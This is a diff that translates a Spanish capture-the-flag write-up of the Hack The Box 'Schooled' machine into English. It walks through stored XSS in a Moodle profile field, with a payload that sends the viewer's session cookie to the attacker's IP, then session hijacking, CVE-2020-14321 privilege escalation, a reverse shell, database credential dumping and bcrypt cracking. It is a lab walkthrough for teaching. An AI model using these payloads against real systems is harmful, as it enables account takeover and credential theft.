@@ -12,6 +12,7 @@
 - Abusing sudoers privilege
 
 # Enumeration
+****
 We will start by performing a scan of the ports that are open on the target IP, using the nmap tool.
 This can be done as follows:
 ```bash
@@ -32,13 +33,13 @@ now we can do para obtener un poco mas de información sobre los puertos abierto
 nmap -sCV -p22,80,33060 [IP]
 ```
 
-Al enumerar los puertos de la IP objetivo, hemos identificado que nos interesa por ahora particularmente la página web alojada en el puerto 80.
+By listing the ports of the target IP, we have identified that for now we are particularly interested in the webpage hosted on port 80.
 
 ### Website Enumeration
-Llevaremos a cabo dos procesos de enumeración sobre esta pagina antes de ingresar en ella.
+We will perform two enumeration processes on this page before entering it.
 
-- Con la herramienta "whatweb" podemos obtener mas información de esta pagina
-- Con el script "http-enum" con el que cuenta la herramienta nmap 
+- With the tool "whatweb" we can obtain more information about this page.
+- With the "http-enum" script provided by the nmap tool
 - 
 ```bash
 whatweb [IP]
@@ -49,109 +50,113 @@ nmap --script http-enum -p80 [IP]
 ![whatweb&scriptnmap](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/whatweb%26scriptnmap.PNG)
 
 
-De esta forma podemos ver que el sitio web en primer lugar es un FreeBSD y además podemos observar lo que parece ser un correo electronico **"admissions@schooled.htb"** Lo que nos puede interesar acerca de esto es que contamos con un dominio ```"schooled.htb"```. 
+"In this way, we can see that the website is primarily running on FreeBSD, and furthermore, we can observe what appears to be an email address "admissions@schooled.htb". What may interest us about this is that we have a domain "schooled.htb".
 
-Asi que procederemos a entrar al sitio web
+So, we will proceed to enter the website."
 
 ![web](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/web.PNG)
 
-Por ahora no vemos nada interesante, así, que en caso de que se este aplicando **Virtual Hosting** sobre el sitio web
-Añadiremos en el archivo "/etc/hosts" el dominio que encontramos anteriormente. Ya que en algunos casos, acceder al sitio web mediante la dirección IP y acceder mediante un dominio no es lo mismo
 
-**¿Que es Virtual Hosting?** [https://httpd.apache.org/docs/2.4/vhosts/].
+For now, we don't see anything interesting, so in case Virtual Hosting is being applied to the website, we'll add the domain we found earlier to the "/etc/hosts" file. Because in some cases, accessing the website via the IP address and accessing it via a domain is not the same.
+
+**What is Virtual Hosting?** [https://httpd.apache.org/docs/2.4/vhosts/].
 
 
 ![schooled.htb](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/schooled.htb.PNG)
 
-Ingresemos al sitio nuevamente haciendo uso de este dominio
+Let's enter the site again using this domain name
 
 ![webSchooled.htb](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/webSchooled.htb.PNG)
 
-Y en este caso, pues el contenido de la pagina web es exactamente el mismo.
-Así que explorando un poco más la pagina, en el apartado "teachers" podemos ver profesores que hacen parte de la institución educativa y su respectivo rol en esta. 
+And in this case, the content of the web page is exactly the same.
+So exploring the page a little more, in the "teachers" section we can see teachers that are part of the educational institution and their respective role in it. 
 
 ![teachers](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/teachers.PNG)
 
-De esta forma podemos ver que como atacantes nos interesaria poder acceder a la cuenta de "Lianne Carter" teacher, ya que cuenta con un rol de manager
+In this way we can see that as attackers we would be interested in accessing to the account of "Lianne Carter" teacher, since she has a manager role.
 
 # Moodle
 ****
-Lo que podemos hacer ahora en busqueda de mas información sobre el sitio web es aplicar un reconocimiento de subdominios. Esto lo podemos hacer a través de la herramienta "gobuster"
+What we can do now in search of more information about the website is to apply a subdomain reconnaissance. This can be done through the tool "gobuster".
 
 ```bash
 gobuster vhost -u http://schooled.htb -w [wordlistPATH] -t 64 --apend-domain
 ```
 ![subdominio](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/subdominio.PNG)
 
-gobuster encontró como subdominio existente en el sitio web **"moodle.schooled.htb"**
-Así que vamos a agregar este subdominio en nuestro archivo "/etc/hosts"
+gobuster found as existing subdomain on the website **"moodle.schooled.htb "**.
+So let's add this subdomain in our file "/etc/hosts".
 
 ![moodle.schooled.htb](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/moodle.schooled.htb.PNG)
 
-**¿Que es Moodle?** [https://es.wikipedia.org/wiki/Moodle]
+**What is Moodle?** [https://es.wikipedia.org/wiki/Moodle]
 
 ![paginamoodle](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/paginamoodle.PNG)
-Efectivamente, el sitio web cuenta con un subdominio en el que podemos ver un Moodle que hace parte de la institución educativa
+Indeed, the website has a subdomain where we can see a Moodle that is part of the educational institution.
 
-Así que creemos una cuenta nueva y entremos al moodle
+So let's create a new account and log into moodle.
 
-Algo curioso es que al intentar registrarme en el Moodle, al colocar un correo electronico es requisito que este pertenezca al dominio **"student.schooled.htb"**
+Something curious is that when I try to register in Moodle, when I enter an email address it is required that it belongs to the domain **"student.schooled.htb "**.
 
 
 ![emailleakinfo](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/emailleakinfo.PNG)
 
 
-(Al incorporar este subdominio en el archivo /etc/hosts nos lleva a la misma pagina inicial)
+(When incorporating this subdomain into the /etc/hosts file, it takes us to the same initial page.)
 
-Una vez creada la cuenta nos encontraremos con esto:
+Once the account is created, we will encounter this:
 
 ![moodledashboard](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/moodledashboard.PNG)
 
-Si nos dirigimos al apartado de "site home" encontraremos una serie de cursos que se ofrecen en la institución educativa. Revisando cada uno de los cursos podremos ver que solo podemos auto-inscribirnos en el curso de "Mathematics" que dirige el profesor "Manuel Phillips". Así que nos inscribiremos.
+If we go to the "site home" section, we will find a list of courses offered at the educational institution. By reviewing each of the courses, we can see that we can only self-enroll in the "Mathematics" course, which is led by Professor "Manuel Phillips". So, let's enroll in that course.
 
 # Moodle Foothold
 ****
 ![Announcements](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/Announcements.PNG)
 ![reminder](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/reminder.PNG)
 
-En la sección "Announcements" del curso "Mathematics" en el que nos inscribimos, podemos ver el anuncio "Reminder for joining students". En este, el profesor nos indica that we need to set our ```"MoodleNet profile"``` y que estara revisando los perfiles de los estudiantes inscritos para verificar que el estudiante haya configurado este campo.
+In the "Announcements" section of the "Mathematics" course where we enrolled, we can see the announcement titled "Reminder for joining students". In this announcement, the professor informs us that we need to set our **"MoodleNet profile"** and that he will be reviewing the profiles of enrolled students to verify that they have configured this field.
 
-Por lo tanto, yendo a los ajustes del perfil de Moodle podemos ver el campo ```"MoodleNet profile"```
+Therefore, by going to the Moodle profile settings, we can see the "MoodleNet profile" field.
 
 ![moodlenet](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/moodlenet.PNG)
 
-**Pero... ¿que tipo de información debe ir en este campo?**
-Bueno, intentemos escribiendo una palabra de test
+
+**But... what type of information should go in this field?** 
+Well, let's try entering a test word.
 
 ![test](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/test.PNG)
 
 
-Vemos que en nuestro perfil de moodle se muestra:
+We see that in our Moodle profile it shows:
 
 ![showingtest](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/showingtest.PNG)
 
-De esta forma, lo que podemos probar como atacantes es verificar si el campo ```"MoodleNet profile"``` es vulnerable a XSS (Cross-Site Scripting)
-**¿Que es Cross-Site Scripting?** [https://www.welivesecurity.com/la-es/2021/09/28/que-es-ataque-xss-cross-site-scripting/]
+In this way, what we can try as attackers is to verify if the "MoodleNet profile" field is vulnerable to XSS (Cross-Site Scripting).
+**What is Cross-Site Scripting (XSS)?** [https://www.welivesecurity.com/la-es/2021/09/28/que-es-ataque-xss-cross-site-scripting/]
 
-Entonces, lo que haremos es inyectar en el campo ```"MoodleNet profile"``` a test payload como el siguiente:
+So, what we will do is inject a test payload into the "MoodleNet profile" field, like the following:
 ```bash
 <script>alert('XSSTest'.)</script>
 ```
-De esta forma, si actualizamos los cambios realizados en el perfil de Moodle y sí efectivamente el campo ```"MoodleNet profile"``` es vulnerable a **XSS**, al entrar a nuestro perfil de Moodle nos saldra una pequeña ventana emergente
+This way, if we update the changes made to the Moodle profile and indeed the "MoodleNet profile" field is vulnerable to XSS, upon entering our Moodle profile, a small popup window will appear.
 
 ![XSSTest](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/XSSTest.PNG)
 
-Perfecto!
-### Exploiting XSS Vulnerabilities for Session Cookie Stealing
-Teniendo en cuenta que el profesor estara revisando los perfiles de los estudiantes inscritos al curso, podemos **intentar robar su cookie de sesion** mediante un script malicioso inyectado en el campo ```"MoodleNet profile"```.
+**Nice!**
 
-Para esto, utilizaremos el siguiente comando para establecer un servidor web simple por el puerto 80 de nuestra maquina
+### Exploiting XSS Vulnerabilities for Session Cookie Stealing
+****
+Considering that the professor will be reviewing the profiles of enrolled students in the course, we could attempt to **steal their session cookie** by injecting a malicious script into the ```"MoodleNet profile"``` field.
+
+For this, we will use the following command to set up a simple web server on port 80 of our machine.
 ```python
 python3 -m http.server 80
 ```
 ![python3sever](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/python3sever.PNG)
 
-Ahora inyectaremos en el campo ```"MoodleNet profile"``` el siguiente payload que se encargara de robar la cookie de sesión del usuario que ingrese a nuestro perfil de Moodle 
+
+Now we will inject the following payload into the ```"MoodleNet profile"``` field which will be responsible for stealing the session cookie of the user who accesses our Moodle profile.
 
 ```sh
 <script>var i=new Image(); i.src="http://[OurIP]/?cookie="+btoa(document.cookie);</script>
@@ -160,9 +165,9 @@ Ahora inyectaremos en el campo ```"MoodleNet profile"``` el siguiente payload qu
 ![cookie](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/cookie.PNG)
 
 
-Podemos ver como se envia a nuestro servidor la cookie de sesión del profesor "Manuel Phillips"
-Sin embargo, esta cookie se encuentra codificada en base64, asi que tenemos que decodificarla:
 
+We can see how the session cookie of Professor "Manuel Phillips" is sent to our server. 
+However, this cookie is encoded in base64, so we need to decode it.
 
 ![stealingcookie](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/stealingcookie.PNG)
 
@@ -170,42 +175,47 @@ Sin embargo, esta cookie se encuentra codificada en base64, asi que tenemos que 
 ```bash
 MoodleSession=lan2a2hc9ub9qhkhdful6mnff2
 ```
-Ahora que contamos con la cookie de sesion del profesor, podemos autenticarnos como el profesor
+Now that we have the session cookie of the professor, we can authenticate ourselves as the professor.
 
 ![cookieantes](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/cookieantes.PNG)
 
+`We replace our cookie with Professor Manuel Phillips cookie.`
+
 ![cookiedespues](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/cookiedespues.PNG)
 
-Perfecto!
+**Nice!**
 
 ![Impersonification](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/Impersonification.PNG)
 
-Podemos ver como en la parte superior derecha se nos muestra que estamos dentro del sistema como el usuario **"Manuel Phillips"**
+We can see how in the top right corner it shows us that we are logged into the system as the user **"Manuel Phillips"**
 
 ![Perfilprofe](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/perfilprofe.PNG)
 
-Revisando el perfil del profesor, podemos ver que su correo pertenece a un dominio distinto, podemos probar si este dominio se encuentra como un subdominio del sitio web de la institución educativa. Sin embargo, este subdominio nos redirige a la misma pagina inicial.
+Reviewing the professor's profile, we can see that his email belongs to a different domain. We can try to see if this domain is listed as a subdomain of the educational institution's website. 
+(However, this subdomain redirects us to the same initial page.)
 
 # Moodle Version and Possible Vulnerabilities
 ****
 
-Como Moodle es una aplicación Open Source, podemos investigar un poco acerca de sus contenidos por medio de:
+As Moodle is an open-source application, we can investigate its contents through:
 [https://github.com/moodle/moodle]
 
-Existe un archivo que nos permite ver hasta la fecha en que versión de Moodle nos encontramos, esta ruta es:
+There is a file that allows us to see which version of Moodle we are currently using, and its path is:
 
 ``` theme/upgrade.txt ```
-Así que la podemos colocar en el navegador y consultar el archivo "upgrade.txt"
+So we can place it in the browser and consult the file "upgrade.txt".
 ![versionmoodle](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/versionmoodle.PNG)
 
-Así, parece ser que la **versión de Moodle que esta corriendo en el servidor es la "3.9"**
+So, it appears that the **version of Moodle running on the server is "3.9"**.
 
-Con esta información podemos utilizar **"searchsploit"** para buscar vulnerabilidades sobre esta version de moodle
+With this information, we can use **"searchsploit"** to search for vulnerabilities related to this version of Moodle.
+
+
 ```bash
 searchsploit Moodle 3.9
 ```
 
-Podemos ver un exploit titulado como:
+We can see theres an exploit titled as:
 >Moodle 3.9 - Remote Code Execution (RCE) (Authenticated)
 
 ![searchsploit](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/searchsploit.PNG)
@@ -216,20 +226,20 @@ searchsploit -x 50180
 
 ![exploitanalisis](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/exploitanalisis.PNG)
 
-Analizando un poco la estructura del exploit poodemos ver que lo que parece que esté intenta hacer es autenticarnos como manager y luego intentar aumentar los privilegios de la manager account para tener la capacidad de instalar plugins sobre el sistema
+Analyzing a little the structure of the exploit we can see that what it seems to be trying to do is to authenticate us as manager and then it tries to increase the privileges of the manager account to have the ability to install plugins on the system.
 
 _At this point we could directly use the exploit and complete the machine eventually, however, to have a better understanding of what is going on regarding the vulnerability in this version of Moodle, we will do it manually._
 
-Es importante mencionar que Moodle cuenta con un apartado de "Security Announcements", por lo que nos interesa saber de que fecha data la versión 3.9 de Moodle
+It is important to mention that Moodle has a "Security Announcements" section, so we are interested in knowing the date of Moodle 3.9 version.
 
 ![moodledate](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/moodledate.PNG)
 
-Así, en la pagina [https://moodle.org/security/] podemos consultar por la fecha de la versión 3.9 de Moodle
+Thus, in the page [https://moodle.org/security/] we can check the date of Moodle 3.9 version 3.9
 
 ![moodlevuln](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/moodlevuln.PNG)
 
-Así, podemos ver que existe una vulnerabilidad sobre esta versión de Moodle identificada como: **CVE-2020-14321**
-en la que podemos escalar privilegios a "manager role" partiendo desde un usuario de "Teacher". La vulnerabilidad funciona mediante la explotación de un "Mass Assignment Attack"
+We can see that there is a vulnerability on this version of Moodle identified as: **CVE-2020-14321**
+"Course enrolments allowed privilege escalation from teacher role to manager role, enabling Remote Code Execution (RCE) through a 'Mass Assignment Attack' vulnerability."
 
 **¿Que es Mass Assignment Attack?**
 https://www.vaadata.com/blog/what-is-mass-assignment-attacks-and-security-tips/
@@ -237,22 +247,22 @@ https://www.vaadata.com/blog/what-is-mass-assignment-attacks-and-security-tips/
 ## Teacher Self-Assignment to Manager Role
 ****
 
-Partiendo del hecho de que nos encontramos autenticados as the Manuel Phillips Teacher Nos vamos a dirigir a la lista de participantes del curso de matematicas que este usuario dirige. Podemos ver que contamos con un pequeño boton nombrado como "Enrol Users" en el que al parecer tenemos la capacidad de inscribir a estudiantes al curso de manera forzada.
+Starting from the fact that we are authenticated as the Manuel Phillips Teacher, we are going to navigate to the list of participants in the mathematics course that this user directs. We can see that we have a small button named "Enrol Users" in which it seems we have the ability to enroll students to the course forcibly.
 
-**En este punto quiero que recordemos que contabamos con la información de que profesores se encontraban adscritos a la institución educativa**
+**At this point I would like to remind you that we had the information on which teachers were assigned to the educational institution.**
 
 ![teachers](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/teachers.PNG)
 
-y como atacantes nos interesaria poder acceder a la cuenta de "Lianne Carter" teacher, ya que cuenta con un rol de manager.
-Así que intentemos añadir al usuario "Lianne Carter" al curso de matematicas
+As attackers we would be interested in accessing the account of "Lianne Carter" teacher, since she has a manager role.
+So let's try to add the user "Lianne Carter" to the mathematics course.
 
 ![Agregaralcurso](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/Agregaralcurso.PNG)
 
-El usuario "Lianne Carter" ha sido exitosanente inscrita en el curso de matematicas
+The user "Lianne Carter" has been successfully enrolled in the mathematics course.
 
 ![Agregada](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/Agregada.PNG)
 
-Entonces, vamos a eliminar a este usuario de la lista de participantes del curso y analicemos con **Burpsuite** que ocurre cuando se envia la petición al agregar al usuario "Lianne Carter" al curso.
+So, let's remove this user from the list of course participants and let's analyze with **Burpsuite** what happens when the request is sent when adding the user "Lianne Carter" to the course.
 
 `(request intercepted by Burpsuite)`
 ```sh
@@ -269,33 +279,34 @@ Referer: http://moodle.schooled.htb/moodle/user/index.php?id=5 11 Cookie: Moodle
 
 ![burpsuite](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/burpsuite.PNG)
 
-```Es importante que la peticion interceptada por Burpsuite la enviemos al Repeater, allí haremos cambios y enviaremos la petición```
+```It is important that the request intercepted by Burpsuite is sent to the Repeater, where we will make changes and send the request.```
 
-Podemos observar que la solicitud pasa dos parametros de interes:
+We can see that the request passes two parameters of interest:
 -`userlist%5B%5D = 25`
 -`roletoassign = 5`
 
 - **userlist%5B%5D**
-Para revisar la lista de usuarios en el sistema, podemos darnos cuenta que si consultamos nuestro perfil de Moodle (Que en este momento corresponde al del usuario Manuel Phillips). Podemos ver que en la barra del buscador la **"id"** del perfil corresponde a aquella identificada con el numero "24"
+To review the list of users in the system, we can see that if we consult our Moodle profile (which at this moment corresponds to the user Manuel Phillips). We can see that in the search bar the **"id "** of the profile corresponds to the one identified with the number "24".
 
 ![profileid](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/profileid.PNG)
 
-Si cambiamos este valor en nuestro buscador, por el numero "25" 
+If we change this value in our search engine, by the number "25".
 
 ![Lianncarterid](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/Lianncarterid.PNG)
 
-Se nos redirige al perfil del usuario "Liann Carter" en Moodle 
+We are redirected to the Moodle profile of the user "Liann Carter".
 
-(creo que esto corresponderia a una vulnerabilidad leve de **Web Parameter Tampering** [https://owasp.org/www-community/attacks/Web_Parameter_Tampering])
+(I think this would correspond to a mild **Web Parameter Manipulation** vulnerability. [https://owasp.org/www-community/attacks/Web_Parameter_Tampering])
 
 **Back to the point**
 
-Lo que podemos hacer entonces, es que haciendo uso de Burpsuite, con la petición interceptada podemos cambiar el valor de "25" a "24". y en seguida para el parametro:
+What we can do then, is that using Burpsuite, with the intercepted request we can change the value from "25" to "24". and then for the parameter:
 - **roletoassign**
-Moodle gestiona mediante la petición al parametro "roletoassign" que rol como profesor se desea tener sobre el usuario que se va a agregar al curso. **[Lo que es demasiado riesgoso].**
-Desconocemos a que hace referencia el valor "5", pero podriamos pensar que si este valor es cambiado por un **"1"**. Por lo general este valor hace referencia al rol de **Administrador**. Así que cambiemos este parametro con la idea de que nos otorgaremos un privilegio de **Administrador** sobre el usuario al que vamos a agregar al curso.
+Moodle manages through the request sent what role as a teacher you want to have on the user to be added to the course through the parameter "roletoassign" **[What is too risky]**
 
-Por lo tanto, nuestra petición interceptada deberia lucir de la siguiente forma:
+We do not know what the value "5" refers to, but we could think that if this value is changed to a **"1"**. Usually this value refers to the **Administrator** role. So let's change this parameter with the idea that we will grant an **Administrator** privilege over the user we are going to add to the course.
+
+Therefore, our intercepted request should look like this:
 
 `(Modified request intercepted by Burpsuite)`
 
@@ -306,55 +317,55 @@ Por lo tanto, nuestra petición interceptada deberia lucir de la siguiente forma
 >.
 ><SNIP>
 
-Una vez enviada la petición mediante el **Burpsuite Repeater** , en la sección **Proxy** de **Burpsuite**, let's drop the intercepted request.
+Once the request has been sent through the **Burpsuite Repeater**, in the **Proxy** section of **Burpsuite**, let's drop the intercepted request.
 
-when you drop the intercepted request, the user "Lianne Carter" will not be added to the course, so we are going to add her back in the normal way, without intercepting the request, just to have the facility to go to her profile.
+When you drop the intercepted request, the user "Lianne Carter" will not be added to the course, so we are going to add her back in the normal way, without intercepting the request, just to have the facility to go to her profile.
 
 Once in the profile of "Lianne Carter" we will be able to notice that we have the privileges of **Log in as Lianne Carter**.
 
 ![privilegiosLianne](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/privilegiosLianne.PNG)
 
-Nice!
+**Nice!**
 
 ![logueado](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/logueado.PNG)
 
-Esto es una implementación con la que cuenta Moodle, nos encontramos autenticados como Manuel Phillips but logged in as Lianne Carter
+This is a Moodle implementation, we are authenticated as Manuel Phillips but logged in as Lianne Carter.
 
 ![manuelLianne](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/manuelLianne.PNG)
 
 
-Ahora, logged in as this user, we will have access to a "Site administration" panel
+Now, logged in as this user, we will have access to a "Site administration" panel
 
 ![Site_administration](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/Site_administration.PNG)
 
-**En Moodle una de las principales formas que hay para lograr inyectar comandos suele ser el panel de Plugins, sin embargo, a pesar de estar autenticados como Liann Carter, parece que no tenemos privilegios para subir Plugins al sistema**
+**In Moodle one of the main ways to inject commands is usually the Plugins panel, however, despite being authenticated as Liann Carter, it seems that we do not have privileges to upload Plugins to the system**
 
 ![pluginsoff](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/pluginsoff.PNG)
 
 # Mass Assignment Attack 
 ****
-En el apartado "Users" podemos ver una sección "Permissions" 
+In the "Users" section we can see a section "Permissions".
 
 ![permissions](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/permissions.PNG)
 
-allí ingresaremos a "Define roles"
+There we will enter "Define roles"
 
 ![listapermissions](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/listapermissions.PNG)
 
-Si damos click a "Manager" parece que tenemos un listado extenso de todo aquello que "Manager" role tiene permitido en Moodle y todo aquello que "Manager" role no tiene permitido en Moodle.
+If we click on "Manager" we seem to have an extensive list of everything that "Manager" role is allowed in Moodle and everything that "Manager" role is not allowed in Moodle.
 
-**¿Que se nos puede ocurrir?** un **Mass Assignment Attack** 
-Así que vamos dar click en "Edit", activaremos **Burpsuite** and we will "Save Changes" para interceptar la petición
+**What can we come up with?** a **Mass Assignment Attack**
+So we will click on "Edit", we will activate **Burpsuite** and we will "Save Changes" to intercept the request.
 
 ![burpsuitemass](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/burpsuitemass.PNG)
 
-Lo que vemos en Burpsuite son aquellos permisos y su valor con los que actualmente cuenta el usuario "Lianne Carter" en el sistema.
+What we see in Burpsuite are those permissions and their value that the user "Lianne Carter" currently has in the system.
 
-Existe un repositorio de GitHub acerca del (CVE-2020-14321) [https://github.com/HoangKien1020/CVE-2020-14321]
+There is a **GitHub repository** about the (CVE-2020-14321) [https://github.com/HoangKien1020/CVE-2020-14321]
 
-Aqui, en la sección "Payload to full permissions" parece explotarse un Mass Assignment Attack to have the full permissions in the system. Veremos que el estilo del Payload es muy similar a lo que tenemos en Burpsuite, **asi que vamos a reemplazarlo**
+**Here**, in the section "Payload to full permissions" it seems to exploit a Mass Assignment Attack to have the full permissions in the system. We will see that the style of the Payload is very similar to what we have in Burpsuite, **so let's replace it**.
 
-Ahora, verificaremos que tengamos los privilegios para subir Plugins al sistema:
+Now, we will verify that we have the privileges to upload Plugins to the system:
 
 
 ![pluginson](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/pluginson.PNG)
@@ -378,7 +389,7 @@ So that is the Path that we will have to write in our web browser to execute com
 
 Now, what we want to do is to send a **reverse shell** to our system
 
-so with netcat we are going to establish a listening port, in my case I will do it on port "4444" and we will inject through the plugin the following command
+So with netcat we are going to establish a listening port, in my case I will do it on port "4444" and we will inject through the plugin the following command
 
 ![reverse](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/reverse.PNG)
 
@@ -392,25 +403,24 @@ We will find a file "config.php" Containing database login credentials
 
 ![config](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/config.PNG)
 
-Resulta que el valor de $PATH del usuario que nos provee la shell en el sistema ("www") es muy corto y no abarca todas las vias en las que pueden haber comandos que se puedan utilizar, por esto, una solución que podemos aplicar es en nuestro sistema:
+It turns out that the value of $PATH of the user that provides us the shell in the system **www** is very short and does not cover all the ways in which there can be commands that can be used, for this, a solution that we can apply is in our system:
 
 ```bash
 echo $PATH
 ```
 
-copiamos el valor de nuestro $PATH, (no importa que hayan rutas que tal vez no existan en la maquina objetivo, esto nos servira para que el usuario ("www") de la shell pueda ejecutar mas comandos). Y en la maquina objetivo escribimos el comando:
+We copy the value of our $PATH, (it doesn't matter that there are paths that may not exist on the target machine, this will serve us so that the user **www** of the shell can execute more commands). And in the target machine we write the command:
 
 ```bash
-export PATH=[Aqui va todo nuestro $PATH] 
+export PATH=[Here goes our $PATH] 
 ```
-Ahora si podremos utilizar comandos como "mysql"
-una vez hecho eso:
-
+Now we will be able to use commands like 'mysql'.
+Once that's done:
 
 ```bash
 mysql -umoodle -pPlaybookMaster2020 -e 'show databases'
 ```
-Aqui debe usarse la flag -e para ejecutar comandos sin entrar a un "mysql" interactivo, partiendo desde que no se cuenta con una consola interactiva en la reverse shell lo cual nos dara problemas para ejecutar comandos interactivos :/
+Here, the **'-e'** flag should be used to execute commands without entering an interactive 'mysql'. This is because we don't have an interactive console in the reverse shell, which would cause problems for executing interactive commands.
 
 ![showdatabases](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/showdatabases.PNG)
 
@@ -426,7 +436,7 @@ mysql -umoodle -pPlaybookMaster2020 -e 'describe mdl_user' moodle
 
 ![columns](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/columns.PNG)
 
-Aqui las columnas de interes serian username | password | email
+Here, the columns of interest would be: username | password | email.
 
 
 ```bash
@@ -435,136 +445,134 @@ mysql -umoodle -pPlaybookMaster2020 -e 'select username,password,email from mdl_
 
 ![credenciales](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/credenciales.PNG)
 
-Al contar con un listado de credenciales, podemos revisar si en la maquina se cuenta con apartados en el directorio /home
+Having a list of credentials, we can check if there are any sections in the directory /home
 
 ![home](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/home.PNG)
 
 
-De todas estas nos interesan aquellas de "jamie" y "steve" ya que son los usuarios que cuentan con un directorio en /home
+Of all these, we're interested in those of 'jamie' and 'steve' since they are the users with a directory in /home. Additionally, Jamie is an Admin and Steve is not listed in the database. So, let's copy the corresponding hash of Jamie (Admin) to our system.
 
-Además de que Jamie es Admin y pues steve no esta en el listado de la base de datos. Así que vamos a copiarnos a nuestro sistema el Hash correspondiente a Jamie (Admin)
-
-Si rompemos el hash y pensamos en que podria estarse reutilizando la clave del usuario Jamie, podriamos ingresar por ssh al sistema
-Podemos romper el hash utilizando herrramientas como hashcat y reconociendo el formato con el que esta encriptada la contraseña
-Esto lo podemos hacer asi:
+If we crack the hash and consider the possibility of Jamie's password being reused, we could gain SSH access to the system. We can crack the hash using tools like hashcat, identifying the encryption format of the password. We can do this as follows:
 
 ### Pequeña anotación [¿Como reconocer probables formatos de Hashes?]
 
 
-Esto lo podemos hacer mediante el uso de expresiones regulares
-Tenemos nuestro Hash a romper:
+We can achieve this using regular expressions. 
+We have our hash to crack:
 
 ![hashformat](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/hashformat.PNG)
 
-Así:
+In this way:
 ```bash
 hashcat --example-hashes | grep -oP '\$2\w\$\d{2}\$'
 ```
-De esta forma estamos diciendo que nuestro hash esta compuesto primeramente por los simbolos "$2" seguido de un caracter (y) representado como "w" y luego sigue otro signo "$", seguido de dos digitos y un "$" más
-**[Puede sonar confuso, pero simplemente estamos ingresando el patrón que se observa en el hash con el que contamos]**
+This command utilizes hashcat's example hashes and searches for a specific pattern within them. The pattern begins with "$2", followed by a single character (represented as "w"), then another "$", followed by two digits, and finally ending with another "$".
+**[It might sound complex, but essentially we're inputting the pattern observed in the hash we have.]**
+
 
 ![hashrecognize1](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/hashrecognize1.PNG)
 
-y vemos que hay por lo menos 4 tipos de formatos que se adecuan a nuestro hash, sin embargo, vemos que aquellos de forma ($2a$05$) serian los mas probables, asi que vamos a filtrar con grep para ese patrón:
-**(Es necesario colocar antes de los signos "$" un "\\" para que sea posible reconocerlos)**
+And we see that there are at least 4 types of formats that fit our hash. However, we see that those in the form ($2a$05$) would be the most probable. So, let's filter for that pattern using grep:
+**(It's necessary to place "\\" before the "$" signs to recognize them.)**
 ```bash
 hashcat --example-hashes | grep '\$2a\$05\$' -B 11
 ```
 ![hashrecognize2](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/hashrecognize2.PNG)
-Y podemos ver que el formato mas probable del hash es **"bcrypt"**
+And we can see that the most likely format of the hash is **"bcrypt"**
 
-Así que entonces utilizemos **hashcat** para crackear el Hash.
+So, let's use **hashcat** to crack the hash
 
 ```bash
 hashcat -m 3200 -a 0 hash /[wordlist] --user
 ```
-Donde:
-- -m indica el modo a utilizar para romper el hash (bcrypt)
-- -a indica el modo de ataque (fuerza bruta)
-- hash (nombre del archivo donde se encuentra el hash)
